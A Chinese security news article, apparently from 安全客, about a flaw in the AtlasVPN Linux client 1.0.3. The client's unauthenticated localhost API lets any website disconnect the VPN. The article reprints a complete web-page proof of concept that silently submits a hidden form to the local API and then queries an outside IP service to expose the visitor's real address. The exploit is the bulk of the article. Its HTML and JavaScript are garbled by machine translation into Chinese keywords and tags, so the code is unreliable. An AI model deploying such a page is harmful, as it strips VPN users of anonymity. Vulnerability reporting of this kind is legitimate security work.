#  匿名研究员发布AtlasVPN Linux 客户端 1.0.3 远程断开连接漏洞POC   
 安全客   2023-09-05 16:58  
  
日前，国外Reddit   
网站上出现了有关Linux操作系统 的AtlasVPN客户端发现严重安全漏洞的  
信息  
。  
  
一位匿名的网络安全研究人员发布了一个有效的PoC  
漏  
‍洞  
，并向公众演示了攻击者如何通过在其恶意网站上发布漏洞代码来访问 Linux 版本 VPN 客户端的任何用户的真实IP  
地址  
。  
  
**根本原因**  
  
AtlasVPN Linux 客户端由两部分组成。管理连接的守护进程 (atlasvpnd) 和用户控制连接、断开连接和列出服务的客户端 (atlasvpn)。  
  
客户端不通过本地套接字或任何其他安全方式进行连接，而是在端口 8076 上的本地主机上打开 API。它没有任何身份验证。  
  
计算机上运行的任何程序（包括浏览器）都可以访问此端口。因此，任何网站上的恶意 JavaScript 都可以向该端口发出请求并断开 VPN。如果它随后运行另一个请求，则会将用户的家庭 IP 地址泄漏到使用漏洞代码的任何网站。  
  
**漏洞利用代码**  
  
以下代码演示了该问题。它可以上传到任何网络服务器。当访问该站点时，AtlasVPN 会断开连接并泄露 IP 地址。不用于非法目的。  
```

<html>
 <头>
  <title>=[ atlasvpnd 1.0.3 远程断开连接利用]=</title>
</头>
 <正文>
  <pre><code id="log">=[ atlasvpnd 1.0.3 远程断开连接利用 ]=
 您应该运行 atlasvpn Linux 客户端并连接到 VPN。
使用<b>atlasvpn connect</b>连接到VPN服务器。
 </code></pre>
   <iframe id="hiddenFrame" name="hiddenFrame" style="display: none;"></iframe>
  <form id="stopForm" action="http://127.0.0.1:8076/connection/stop" method="post" target="hiddenFrame">
    <button type="submit" style="display: none"></button>
  </形式>
   <脚本>
    window._currentIP = false;
     // 主要运行的漏洞利用代码
    window.addEventListener('加载', function () {
      添加IPToLog();
      setTimeout(triggerFormSubmission, 1000);
      setTimeout(addIPToLog, 3000);
    });
     // 向 atlasvpnd 发送盲 CORS 请求以断开 VPN
    函数触发表单提交（）{
      var logDiv = document.getElementById('log');
      logDiv.innerHTML += "[-] 正在向 atlasvpnd 发送中断连接请求...\n";
      document.getElementById('stopForm').submit();
    }
     // 从ipfy API获取IP（当然，这可能是你的服务器）
    函数 addIPToLog() {
      var logDiv = document.getElementById('log');
      var xhr = new XMLHttpRequest();
       xhr.open('GET', 'https://api.ipify.org?format=json', true);
       xhr.onload = 函数 () {
        var ipAddress = window._currentIP;
        if (xhr.status === 200) {
          var 响应 = JSON.parse(xhr.responseText);
          ip地址 = 响应.ip;
           logDiv.innerHTML += '[?] 当前IP:' + ipAddress + "\n";
        }另外{
          logDiv.innerHTML += '[-]获取IP地址时出错。\n';
        }
         //检查IP是否改变。如果是：成功。
        if (window._currentIP && window._currentIP != ipAddress) {
          logDiv.innerHTML += "[+] 成功断开VPN。"
        }
        if (window._currentIP && window._currentIP == ipAddress) {
          logDiv.innerHTML += "[-] 断开连接失败，因为您一开始就没有连接到VPN。"
        }
         // 保存IP以供下一次迭代使用。
        window._currentIP = ip地址;
      };
       xhr.send();
    }
  </> 脚本
</正文>
</html>
```  
  
“AtlasVPN 并不认真对待用户的安全。他们的软件安全解决方案非常蹩脚，很难相信这是一个错误而不是后门。没有人能如此无能。”一位匿名专家批评该公司的做法。  
  
  
该专家尝试联系AtlasVPN支持人员报告该漏洞，但没有收到回复。他认为，这表明该公司对客户安全的疏忽态度。  
  
截至本新闻发布时，AtlasVPN 代表尚未对此事发表评论。建议所有 Linux 客户端用户在访问  
未经验证的站点时务必谨慎，甚至暂时更换 VPN 客户端，直至漏洞得到修复。  
  
声明：仅供学习参考使用，请勿用作违法用途，否则后果自负  
  
